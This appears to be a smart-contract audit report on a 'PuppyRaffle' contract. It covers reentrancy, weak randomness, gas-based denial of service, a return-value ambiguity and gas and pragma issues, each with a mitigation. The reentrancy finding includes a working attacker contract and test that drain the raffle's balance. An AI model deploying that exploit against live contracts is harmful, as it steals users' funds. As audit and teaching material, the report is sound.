## [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance

**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle::players` array.

```javascript
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(
        playerAddress == msg.sender,
        "PuppyRaffle: Only the player can refund"
    );
    require(
        playerAddress != address(0),
        "PuppyRaffle: Player already refunded, or is not active"
    );

@>  payable(msg.sender).sendValue(entranceFee);
@>  players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

A player who has entered the raffle could have a `fallback` or `receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue the cycle till the contract balance is drained.

**Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.

**Proof of Concept:**

1. Users enter the raffle.
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`.
3. Attacker enters the raffle.
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.

**Proof of Code**
<details>
<summary>Code</summary>

Place the following in `PuppyRaffleTest.t.sol`:

```javascript
function test_reentrancyRefund() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    ReentrancyAttacker attackerContract = new ReentrancyAttacker(
        puppyRaffle
    );
    address attackUser = makeAddr("attakUser");
    vm.deal(attackUser, 1 ether);

    uint256 startingAttackContractBalance = address(attackerContract)
        .balance;
    uint256 startingContractBalance = address(puppyRaffle).balance;

    vm.prank(attackUser);
    attackerContract.attack{value: entranceFee}();

    console.log(
        "Starting Attack Contract Balance: ",
        startingAttackContractBalance
    );
    console.log("Starting Contract Balance: ", startingContractBalance);

    console.log(
        "Ending Attack Contract Balance: ",
        address(attackerContract).balance
    );
    console.log("Ending Contract Balance: ", address(puppyRaffle).balance);
}
```

And this contract as well:

```javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIdx;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIdx = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIdx);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIdx);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}

```
</details>

**Recommended Mitigation:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.

```diff
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(
        playerAddress == msg.sender,
        "PuppyRaffle: Only the player can refund"
    );
    require(
        playerAddress != address(0),
        "PuppyRaffle: Player already refunded, or is not active"
    );

-   payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
+   payable(msg.sender).sendValue(entranceFee);
}
```

## [H-2] Weak Randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner and influence or predict the winning puppy

**Description:** Hashing `msg.sender`, `block.timestamp` and `block.difficulty` together creates a predictable final number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.

*Note:* This additionally means users could front-run this function and call `refund` if they see they are not the winner.

**Impact:** Any yser can influence the winner of the raffle, winning the money and selecting the `rarest` puppy. This makes the entire raffle worthless if it becomes a gas war as to who wins the raffles.

**Proof of Concept:**

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty`. They can use that to predict when and how to participate. See the [solidity blog on prevrandao](https://soliditydeveloper.com/prevrandao). `block.difficulty` was recently replaced with prevrandao.
2. User can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner!
3. Users can revert their `selectWinner` transaction if they don't like themwinner or resulting puppy.

Using on-chain values as a randomness seed is a [well-known attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

**Recommended Mitigation:** Consider using an oracle for your randomness like [Chainlink VRF](https://docs.chain.link/vrf/v2/introduction).


## [M-1] Loop based duplicate-check in `PuppyRaffle::enterRaffle` vulnerable to Denial of Service (DoS) Attack, gas cost keeps incrementing for future participants

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array, is an additional check the loop will have to make.

**Impact:** The gas costs for raffle entrants will greatly increase as more players enter the raffle. This will discourage later users from entering and cause a rush at the start of a raffle to be one of the first entrants in the queue.

An attacker might make `PuppyRaffle::players` array so big, that no one else enters, guaranteeing themselves the win.

**Proof of Concept:**

If we have *100 players* who each enter just themselves then the costs will be as such:

> - Gas cost for 3rd player to enter    : 35627
> - Gas cost for 100th player to enter  : 3966957

In this case, it is more than **111x more expensive** for the 100th player to enter as compared to the 3rd player.

```javascript
function test_DoS() public {
    uint256 gasStart = 0;
    uint256 gasCost = 0;
    uint256 gasPrevCost = 0;

    // Set gas price to 1
    vm.txGasPrice(1);

    // Enter first player.
    // Gas cost will be high - Storage variable warm up
    address[] memory players = new address[](1);
    players[0] = address(1);
    puppyRaffle.enterRaffle{value: entranceFee}(players);

    // Enter second player so that `gasPrevCost` can be set.
    gasStart = gasleft();
    players[0] = address(2);
    puppyRaffle.enterRaffle{value: entranceFee}(players);
    gasCost = (gasStart - gasleft()) * tx.gasprice;

    // Enter remaining players.
    // See that gasCost keeps increasing with the number of players indicating
    // a Denial of Service attack.
    // Gas cost for first player to enter in loop (i = 0)   : 35627
    // Gas cost for last player to enter in loop (i = 100)  : 3966957
    for (uint160 i = 3; i <= 100; i++) {
        gasPrevCost = gasCost;
        gasStart = gasleft();
        players[0] = address(i);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        gasCost = (gasStart - gasleft()) * tx.gasprice;
        console.log("Gas cost: %s", gasCost);
        assert(gasCost > gasPrevCost);
    }

    console.log("Vulnerable to Denial of Service (DOS)");
}
```

**Recommended Mitigation:**

1. Consider allowing duplicates. Users can make new wallet addresses anyway, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check for duplicates. This would allow constant time lookup if an address is present or not.
```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```
3. Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/5.x/api/utils#EnumerableSet)

## [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and for players at index 0, causing a player at index 0 to incorrectly think that they have not entered the raffle

**Description:** For a player at index `0` in `PuppyRaffle::players`, this will return 0 but, according to natspec, it will also return 0 if the player is not in the array.

```javascript
function getActivePlayerIndex(
    address player
) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0;
}
```

**Impact:** A player at index 0 may incorrectly think that they have not entered the raffle and attempt to enter the raffle again thereby wasting gas.

**Proof of Concept:**

1. User enters the raffle, they are the first entrant.
2. User calls `PuppyRaffle::getActivePlayerIndex`. It returns 0.
3. User thinks they have not entered correctly due to the function documentation.

**Recommended Mitigation:**
Any one of the following maybe considered:
1. Revert if the player is not in the array of instead of returning 0.
2. You could also reserve the 0th position for any raffle.
3. Return `int256` where the fucntion returns `-1` if player is not active.


## [G-1] Unchanged state variables should be declared constant or immutable

Reading from storage is much more expensive than reading from a constant or immutable variable.

Instances:
- `PuppyRaffle::raffleDuration` should be `immutable`.
- `PuppyRaffle::commonImageUri` should be `constant`.
- `PuppyRaffle::rareImageUri` should be `constant`.
- `PuppyRaffle::legendaryImageUri` should be `constant`.

## [G-2] Storage variables in a loop should be cached

```diff
+   uint256 playersLength = players.length;
-   for (uint256 i = 0; i < players.length - 1; i++) {
-       for (uint256 j = i + 1; j < players.length; j++) {
+   for (uint256 i = 0; i < playersLength - 1; i++) {
+       for (uint256 j = i + 1; j < playersLength; j++) {
            require(
                players[i] != players[j],
                "PuppyRaffle: Duplicate player"
            );
        }
    }
```

## [I-1] Solidity pragma should be specific, not wide

We recommend avoiding complex pragma statement. Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

	```solidity
	pragma solidity ^0.7.6;
	```

## [I-2] Using an outdated version of Solidity is not recommended

**Description** solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks.

**Recommended Mitigation:** Consider using the latest version of Solidity for testing. Deploy with a new yet stable version of Solidity. Our current recommendation is `0.8.18`

The recommendation take into account:
- Risks related to recent releases
- Risks of complex code generation changes
- Risks of new language features
- Risks of known bugs

Please see [slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) documentation for more information.

## [I-3] ## NC-1: Missing checks for `address(0)` when assigning values to address state variables

Assigning values to address state variables without checking for `address(0)`.

- Found in src/PuppyRaffle.sol [Line: 76](src/PuppyRaffle.sol#L76)

	```solidity
	        feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 99](src/PuppyRaffle.sol#L99)

	```solidity
	        players.push(newPlayers[i]);
	```

- Found in src/PuppyRaffle.sol [Line: 225](src/PuppyRaffle.sol#L225)

	```solidity
	        previousWinner = winner;
	```

- Found in src/PuppyRaffle.sol [Line: 254](src/PuppyRaffle.sol#L254)

	```solidity
	        feeAddress = newFeeAddress;
	```

## [I-4] `PuppyRaffle::selectWinner` does not follow CEI (Checks, Effects, Interactions).

It's best to keep code clean and follow CEI.

```diff
-   (bool success, ) = winner.call{value: prizePool}("");
-   require(success, "PuppyRaffle: Failed to send prize pool to winner");
    _safeMint(winner, tokenId);
+   (bool success, ) = winner.call{value: prizePool}("");
+   require(success, "PuppyRaffle: Failed to send prize pool to winner");
```